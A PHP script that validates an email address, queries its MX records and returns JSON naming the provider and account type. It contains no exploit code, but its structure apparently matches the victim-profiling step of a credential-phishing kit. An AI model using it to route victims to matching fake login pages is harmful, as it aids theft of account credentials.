<?php
session_start();
require_once '../main.php';
$email = $_GET['emaildress'];
function contains(array $arr, $str) {
foreach($arr as $a) {
if (stripos($a,$str) !== false) return true;
}
return false;
}
if (preg_match("/^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*(\.[a-z]{2,})$/i", $email)) {
$formatTest = "passed";

list($alias, $domain) = explode("@", $email);

if (checkdnsrr($domain, "MX")) {
getmxrr($domain, $mxhosts);
if (contains($mxhosts, "google")) {
    $emailProvider = "Google";
} elseif (contains($mxhosts, "yahoo")) {
    if (contains($mxhosts, "aol") !== false) {
        $emailProvider = "Aol";
    } else {
        $emailProvider = "Yahoo";
    }
    
} elseif (contains($mxhosts, "pphosted") || contains($mxhosts, "outlook") || contains($mxhosts, "ppe-hosted")) {
    $emailProvider = "Microsoft";
} elseif (contains($mxhosts, "prodigy.net")) {
    $emailProvider = "Att";
} elseif (contains($mxhosts, "earthlink.net")) {
    $emailProvider = "Earthlink";
} elseif (stripos($domain, "cox.net") !== false) {
    $emailProvider = "Cox";
} elseif (contains($mxhosts, "charter.net")) {
    $emailProvider = "Charter";
} elseif (stripos($domain, "comcast.net") !== false) {
    $emailProvider = "Comcast";
} else {
    $emailProvider = "Microsoft";
}
if (stripos($domain, "yahoo.com") !== false || stripos($domain, "ymail.com") !== false || stripos($domain, "live.com") !== false || stripos($domain, "gmail.com") !== false || stripos($domain, "googlemail.com") !== false || stripos($domain, "outlook.com") !== false || stripos($domain, "hotmail.com") !== false || stripos($domain, "aol.com") !== false || stripos($domain, "mail.com") !== false) {
    $emailType = "Free";
} elseif (stripos($domain, "att.net") !== false || stripos($domain, "sbcgloba.net") !== false || stripos($domain, "frontier.com") !== false || stripos($domain, "optonline.net") !== false || stripos($domain, "comcast.net") !== false || stripos($domain, "opton.net") !== false || stripos($domain, "verizon.net") !== false || stripos($domain, "cox.net") !== false || stripos($domain, "rr.com") !== false) {
    $emailType = "Network";
} elseif (contains($mxhosts, "google")) {
    if (stripos($domain, ".edu") !== false) {
        $emailType = "Institution (Student)";
    } else {
        $emailType = "Business (GSuite)";
    }
} elseif (contains($mxhosts, "outlook") || contains($mxhosts, "pphosted") || contains($mxhosts, "microsoft") || contains($mxhosts, "ppe-hosted")) {
    if (stripos($domain, ".edu") !== false) {
        $emailType = "Institution (Student)";
    } else {
        $emailType = "Business (Office 365)";
    }
} elseif (contains($mxhosts, "amazonaws")) {
    $emailType = "Business (Amazon SES)";
} elseif (stripos($domain, ".edu") !== false) {
    $emailType = "Institution (Student)";
} else {
    $emailType = "Business";
}
    $hostVerify = "passed";
    $emailStatus = "valid";
} else {
        $hostVerify = "failed";
        $emailStatus = "invalid";
}
} else {
$formatTest = "failed";
}
$result = array(
'formatTest' =>   $formatTest,
'emailStatus' => $emailStatus,
'hostVerify' => $hostVerify,
'emailType' => $emailType,
'emailProvider' => $emailProvider
);
echo json_encode($result);
?>